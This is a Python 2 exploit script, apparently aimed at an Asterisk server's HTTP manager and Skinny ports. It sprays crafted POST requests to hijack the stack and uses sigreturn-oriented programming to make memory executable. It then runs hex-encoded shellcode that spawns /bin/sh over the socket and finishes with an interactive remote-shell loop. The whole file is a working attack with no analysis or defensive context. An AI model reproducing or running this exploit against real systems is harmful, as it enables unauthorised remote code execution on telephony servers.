#!/usr/bin/env python
#

import sys, socket, select, struct, time

host, http_port, skinny_port = '127.0.0.1', 8088, 2000
hostname = host
path = "/asterisk/manager"

def tcp_conn(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect( (host, port) )
    return s

def request(path, hostname, content_length):
    return ("POST "+path+" HTTP/1.0\r\n"+
            "Host: "+hostname+"\r\n"+
            "Content-length: "+str(content_length)+"\r\n"+
            "\r\n")

def le32(addr):
	return ''.join( chr( (addr>>i)&0xff ) for i in range(0,32,8) )

def le64(addr):
    return "".join( chr( (addr>>shift) & 0xff ) for shift in xrange(0, 64, 8) )

def chunks(l, n):
	for i in xrange(0,len(l), n):
		yield l[i:i+n]

def insert_string(s, offset, ins):
	return s[:offset] + ins + s[offset+len(ins):]

def put_addr(s, offset, addr):
	return insert_string(s, offset, le64(addr))

def fill_up(s, size):
	return s+"A"*(size-len(s))

#
# Select shellcode
#

sockfd = 34
shellcode = '\x6a'+chr(sockfd)+'5f6a025e6a21580f055648ffce79f5545a545e682f62696e545f816f04d18c97ff6a3b580f05'.decode('hex')

#
# srop
#

VSYSCALL_SYSCALL_RET=0xffffffffff600407
RET=0xffffffffff600409
SEGMENTS_LINUX_3_2=0x0000000000000033

sc = (
	"4c8d50324c8d40ff4801f748c1e6094d31c904090f054829c0488d243757575e"+
	"535a555f500f054801c64829c24885c0587ff1c3"
).decode('hex')

(
	UC_FLAGS, UC_LINK,
	SS_SP, SS_FLAGS,
	SS_SIZE, R8,
	R9, R10,
	R11, R12,
	R13, R14,
	R15, RDI,
	RSI, RBP,
	RBX, RDX,
	RAX, RCX,
	RSP, RIP,
	EFLAGS, SEGMENTS,
	ERR, TRAPNO,
	OLDMASK, CR2,
	FPSTATE, RESERVED1,

) = ( x*8 for x in range(30) )

CONTEXT_SIZE = RESERVED1 + 8

PROT_READ, PROT_WRITE, PROT_EXEC = 1, 2, 4

SYS_READ = 0
SYS_WRITE = 1
SYS_MPROTECT = 10
SYS_SIGRETURN = 15
SYS_EXECVE = 59
SYS_SYNCFS = 306

def srop_bootstrap(sockfd, writable_page, stage2_size,
                   syscall_ret = VSYSCALL_SYSCALL_RET,
                   segments = SEGMENTS_LINUX_3_2,
                   shellcode=sc):
	"""Returns a (sigframe, stage1) tuple, sigframe should be in your ropslide,
	   stage1 should be read by the program after control flow diversion.
	"""

	ucontext = "\0"*(30*8)

	for off, val in ( (UC_FLAGS, 1),
	                  (SS_FLAGS, 2),
	                  (RAX,      SYS_READ),
	                  (RDI,      sockfd),
	                  (RSI,      writable_page),
	                  (RDX,      SYS_SYNCFS),
	                  (RIP,      syscall_ret),
	                  (RSP,      writable_page),
	                  (SEGMENTS, segments) ):
		ucontext = put_addr(ucontext, off, val)

	sigframe = le64(syscall_ret) + ucontext

	shellcode_off = 24+SS_SIZE
	shellcode_addr = writable_page + shellcode_off

	if shellcode_off + len(shellcode) > 24+RDI:
		print "Error: shellcode too big %d vs. %d" % (len(shellcode), RDI-shellcode_off)
		sys.exit(1)

	ucontext = put_addr(ucontext, RAX, SYS_MPROTECT)
	ucontext = put_addr(ucontext, RDI, writable_page)
	ucontext = put_addr(ucontext, RSI, 0x1000)
	ucontext = put_addr(ucontext, RDX, PROT_READ|PROT_WRITE|PROT_EXEC)

	ucontext = put_addr(ucontext, RBX, stage2_size)
	ucontext = put_addr(ucontext, RBP, sockfd)

	stage1 = le64(syscall_ret)*3 + ucontext
	stage1 = insert_string(stage1, shellcode_off, shellcode)
	stage1 = fill_up(stage1, SYS_SYNCFS) + le64(shellcode_addr) + stage1[8:15]

	return (sigframe, stage1)

def get_syscall_ucontext(call, sp, syscallret):
	arg_off = [RAX, RDI, RSI, RDX, R10, R8, R9]

	ucontext = "\0"*CONTEXT_SIZE
	ucontext = put_addr(ucontext, UC_FLAGS, 1)
	ucontext = put_addr(ucontext, SS_FLAGS, 2)
	ucontext = put_addr(ucontext, RIP, syscallret)
	ucontext = put_addr(ucontext, RSP, sp)
	ucontext = put_addr(ucontext, SEGMENTS, 0x0000000000000033)
	for i, val in enumerate(call):
		ucontext = put_addr(ucontext, arg_off[i], val)

	return ucontext

(sigframe, stage1) = srop_bootstrap(sockfd, writable_page=0x7ba000, stage2_size=len(shellcode), shellcode=sc)
exitframe = sigframe[:8]+get_syscall_ucontext([60], 0x7ba000, VSYSCALL_SYSCALL_RET)

#

socks = []

def hijack_stack_insert_sigframe(frame, offset):
	jumper = tcp_conn(host, http_port)
	time.sleep(.05)
	owner = tcp_conn(host, skinny_port)
	owner.send(le32(15-4))
	time.sleep(.05)
	jumper.send(request(path, hostname, offset-0x25a0+0x2000)+le64(RET)*1400+frame+'\n')
	time.sleep(.05)
	owner.send("X"*15)
	socks.append(owner)
	jumper.close()
	time.sleep(.05)

for i in range(25):
	hijack_stack_insert_sigframe(exitframe, (i+1)*507904)
	sys.stdout.write(str(i)+'...')
	sys.stdout.flush()

print

hijack_stack_insert_sigframe(sigframe, 26*507904)

time.sleep(.1)

for s in socks:
	s.send(stage1)

time.sleep(.1)

for s in socks:
	s.send(shellcode+"id\n")

d = { s.fileno(): s for s in socks }
r,_,_ = select.select(d.keys(), [], [])
s = d[r[0]]

#
# Async I/O
#

sockfd = s.fileno()
infd = sys.stdin.fileno()
waitlist = [sockfd, infd]

while len(waitlist) > 0:
    r,w,x = select.select(waitlist, [], [])
    if sockfd in r:
        rdata = s.recv(4096)
        if rdata == '':
            waitlist.remove(sockfd)
        sys.stdout.write(rdata)
        continue
    if infd in r:
        sdata = sys.stdin.readline()
        s.send(sdata)
        if sdata == '':
            s.shutdown(socket.SHUT_WR)
            waitlist.remove(infd)

s.close()

